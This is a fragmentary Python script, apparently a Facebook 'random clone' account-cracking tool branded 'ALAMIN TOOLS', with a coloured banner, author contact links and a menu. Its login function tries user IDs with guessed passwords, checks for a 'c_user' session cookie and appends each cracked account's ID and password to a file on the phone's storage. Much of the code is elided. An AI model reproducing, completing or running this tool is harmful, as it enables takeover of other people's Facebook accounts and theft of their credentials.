...
logo=(""" 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[1;91m\033[1;41m\033[1;97m              WELCOME TO ALAMIN TOOLS                 \033[;0m\033[1;91m\033[1;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
  ...
  /_/  |_/_____/_/  |_/_/  /_/___/_/ |_/   
         ...
         \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS ALAMIN BRAND\033[;0m\033[1;91m═══>\033[1;92m
         \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS ALAMIN BRAND\033[;0m\033[1;91m═══>\033[1;92m
\033[1;31m==================================================
[] AUTHOR       :     ALAMIN
[] TOOLS        :     RENDOM CLONE 
[] TYPE         :       𝐅 𝐑 𝐄 𝐄
[] FACEBOOK     :     ALAMIN HOSSEN
[] VERSION      :      1.0
[] TELEGRAM     :      CYBERARMY20
=================================================="\033[1;23m""")
def Main():
	os.system('clear')
	print(logo)
	...
	if opt in ["A","1"]:
		fuck()
	if opt in ["B","2"]:
		os.system('xdg-open https://t.me/akashxd46');time.sleep(1)
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100076838078407');time.sleep(1)
		fb()
	if opt in ["0","0"]:
		exit()
...
def b(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/ALAMINOK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
